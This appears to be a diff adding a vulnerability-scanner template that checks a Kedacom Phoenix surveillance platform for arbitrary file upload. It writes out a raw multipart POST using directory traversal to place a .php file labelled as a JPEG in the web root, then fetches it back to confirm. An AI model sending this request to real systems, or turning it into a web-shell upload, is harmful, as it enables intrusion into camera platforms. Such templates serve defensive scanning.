@@ -1,0 +1,38 @@
+id: kedacom-phoenix-upload-fcgi-upload
+
+info:
+  name: 科达 Phoenix 监控平台 upload_fcgi 任意文件上传
+  author: 熊猫也是猫
+  severity: critical
+  description: |
+    科达 Phoenix 监控平台 /pmc-bin/upload_fcgi 可将文件上传到 Web 根目录并回读内容。
+    与科达 MTS 转码服务器、DVR 接入网关不是同一 SKU。
+  reference:
+    - https://github.com/zan8in/afrog
+  tags: kedacom,phoenix,fileupload
+
+variables:
+  rfilename: "{{rand_base(10)}}"
+  rbody: "{{rand_base(32)}}"
+
+http:
+  - raw:
+      - |
+        POST /pmc-bin/upload_fcgi?uploadDir=../&uploadName={{rfilename}}.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryabcd1234
+
+        ------WebKitFormBoundaryabcd1234
+        Content-Disposition: form-data; name="Filedata"; filename="{{rfilename}}.php"
+        Content-Type: image/jpeg
+
+        {{rbody}}
+        ------WebKitFormBoundaryabcd1234--
+      - |
+        GET /{{rfilename}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200 && status_code_2 == 200 && contains(body_2, rbody)'
